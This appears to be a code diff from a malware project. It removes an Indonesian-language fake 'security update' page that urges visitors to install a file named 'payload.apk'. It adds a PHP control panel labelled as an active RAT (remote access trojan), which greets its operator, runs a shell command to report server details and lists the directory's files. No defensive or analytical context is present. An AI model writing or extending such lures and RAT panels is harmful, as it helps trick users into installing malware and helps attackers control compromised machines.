@@ -1,13 +1,30 @@
-<!DOCTYPE html>  
-<html>  
-<head>  
-    <title>Download Center</title>  
-</head>  
-<body>  
-    <h1>Update Keamanan</h1>  
-    <p>Klik tombol di bawah untuk menginstal pembaruan.</p>  
-    <a href="payload.apk" download>  
-        <button>Instal Sekarang</button>  
-    </a>  
-</body>  
-</html>  
+<?php
+session_start();
+
+// Cek login
+if (!isset($_SESSION['login'])) {
+    header('Location: login.php');
+    exit;
+}
+
+echo "<h1>🦅 Panel RAT Aktif</h1>";
+echo "<p>Selamat datang, Tuan Anzz.</p>";
+echo "<hr>";
+
+// Info server
+echo "<h3>Informasi Server:</h3>";
+echo "<pre>";
+echo shell_exec('uname -a');
+echo "</pre>";
+
+// Daftar file di direktori
+echo "<h3>Daftar File:</h3>";
+$files = scandir(__DIR__);
+echo "<ul>";
+foreach ($files as $file) {
+    if ($file != '.' && $file != '..') {
+        echo "<li>$file</li>";
+    }
+}
+echo "</ul>";
+?>
